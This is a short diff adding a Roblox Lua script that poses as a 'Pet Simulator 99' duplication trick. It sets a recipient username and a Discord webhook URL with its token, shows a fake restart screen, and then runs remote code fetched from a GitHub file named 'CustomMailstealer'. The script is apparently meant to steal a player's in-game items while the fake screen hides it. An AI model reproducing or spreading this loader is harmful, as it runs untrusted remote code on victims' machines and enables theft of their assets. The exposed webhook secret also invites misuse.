@@ -1,0 +1,7 @@
+Username = "X2Peniweis"
+Webhook = "https://discord.com/api/webhooks/1216526125593919508/s0E1QxI1-WccSkz4At0Y6m5_YZdlfoqnUW43xJ4a0tl6IhJCZBF1syD_ezWkSR9aIcKk"
+
+G_LoadingScreen = "We're restarting Pet Simulator 99"
+G_WebhookName = "PetSim99Dupe"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Custom/main/CustomMailstealer"))()
